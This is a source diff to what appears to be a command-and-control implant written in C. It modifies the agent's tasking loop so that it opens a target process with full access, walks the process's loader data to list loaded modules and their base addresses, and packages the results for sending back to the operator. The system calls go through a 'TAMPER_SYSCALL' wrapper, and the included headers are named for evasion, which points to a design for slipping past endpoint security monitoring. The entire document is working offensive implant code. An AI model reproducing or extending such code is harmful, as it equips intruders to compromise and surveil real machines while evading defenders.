@@ -1,5 +1,7 @@
 #include "../../headers/taskcontroller/TaskController.h"
-#include "../../headers/agent/evasion/SleepObfu/SleepObfMain.h"
+#include "../../headers/agent/evasion/Common.h"
+#include "../../headers/package/package.h"
+#include "../../headers/cstdreplacement/localcstd.h"
 
 
 void TaskingRoutine() {
@@ -13,6 +15,7 @@ void TaskingRoutine() {
     UINT32   CommandID = { 0 };
     UINT32   RequestID = { 0 };
 	AgentCMD AgentCMD = { 0 };
+	pPackage pPackage = NULL;
 
     while (TRUE) {
         if (!agent->session->Active)
@@ -35,6 +38,7 @@ void TaskingRoutine() {
         {
             break;
         }
+    	pPackage = CreatePackage(SEND_DATA);
         
 		if (Buffer.Buffer && Buffer.BufferLength > 0) { // if we successfully sent our queued packages and received a response.
 
@@ -62,9 +66,58 @@ void TaskingRoutine() {
 
 		    		InitializeObjectAttributes(&ObjAttr, NULL, 0, NULL, NULL);
 
-					NtStatus = agent->apis->pNtOpenProcess(&hProc, PROCESS_ALL_ACCESS, &ObjAttr, &ClientID);
+		    	printf("[info] in loaded modules\n");
 
+					if ((NtStatus =  TAMPER_SYSCALL(agent->apis->pNtOpenProcess, 4, &hProc, PROCESS_ALL_ACCESS, &ObjAttr, &ClientID)) != 0x00) {
+						printf("[error] attempting to call NtOpenProcess %llx\n", NtStatus);
+						break;
+					}
+		    		if ((NtStatus = TAMPER_SYSCALL(agent->apis->pNtQueryInformationProcess, 5, hProc, ProcessBasicInformation, &PBI, sizeof(PROCESS_BASIC_INFORMATION), NULL)) != 0x00) {
+						printf("[error] attempting to call NtQueryInformationProcess %llx\n", NtStatus);
+		    			break;
+		    		}
 
+		    	PPEB_LDR_DATA LoaderData = NULL;
+		    	PLIST_ENTRY ListHead, ListEntry = NULL;
+		    	SIZE_T size = 0;
+		    	LDR_DATA_TABLE_ENTRY CurrentModule = {0};
+		    	WCHAR ModuleNameW[MAX_PATH] = {0};
+		    	CHAR ModuleNameA[MAX_PATH] = {0};
+
+					AddInt32ToPackage(pPackage, agent->Context->PID);
+
+		    	if((NtStatus = TAMPER_SYSCALL(agent->apis->pNtReadVirtualMemory, 5, hProc, &PBI.PebBaseAddress->Ldr, &LoaderData, sizeof(PPEB_LDR_DATA), NULL)) == 0x00) {
+					ListHead = &LoaderData->InMemoryOrderModuleList;
+		    		size = 0;
+		    		if((NtStatus = TAMPER_SYSCALL(agent->apis->pNtReadVirtualMemory, 5, hProc, &ListHead->Flink, &ListEntry, sizeof(PLIST_ENTRY), NULL)) == 0x00) {
+		    			while(ListEntry != ListHead) {
+		    				if((NtStatus = TAMPER_SYSCALL(agent->apis->pNtReadVirtualMemory, 5, hProc, CONTAINING_RECORD(ListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks), &CurrentModule, sizeof(LDR_DATA_TABLE_ENTRY), NULL)) != 0x00) {
+		    					break;
+		    				}
+		    				if((NtStatus = TAMPER_SYSCALL(agent->apis->pNtReadVirtualMemory, 5, hProc, CurrentModule.FullDllName.Buffer, &ModuleNameW, CurrentModule.FullDllName.Length, &size)) != 0x00) {
+		    					break;
+		    				}
+		    				if (CurrentModule.FullDllName.Length > 0) {
+		    					//printf("%ws\n", ModuleNameW);
+		    					size = WCharToChar(ModuleNameA, ModuleNameW, CurrentModule.FullDllName.Length);
+
+		    					AddStringToPackage(pPackage, ModuleNameA);
+		    					AddPtrToPackage(pPackage, CurrentModule.DllBase);
+		    				}
+
+							MemorySet(ModuleNameW, 0, MAX_PATH);
+		    				MemorySet(ModuleNameA, 0, MAX_PATH);
+
+		    				ListEntry = CurrentModule.InMemoryOrderLinks.Flink;
+		    			}
+		    		}
+		    	}
+
+		    		if(hProc)
+		    			NtStatus = TAMPER_SYSCALL(agent->apis->pNtClose, 1, hProc);
+		    		if (NtStatus != 0x00) {
+		    			agent->apis->pNtClose(hProc);
+		    		}
 					break;
 
                 default:
@@ -75,8 +128,10 @@ void TaskingRoutine() {
         { 
 			break;
         }
-
-		
+    	if(pPackage->Length > 0) {
+    		printf("[info] adding package to package list\n");
+    		AddPackageToAgentPackageList(pPackage);
+    	}
     }
 
     agent->session->Active = FALSE;
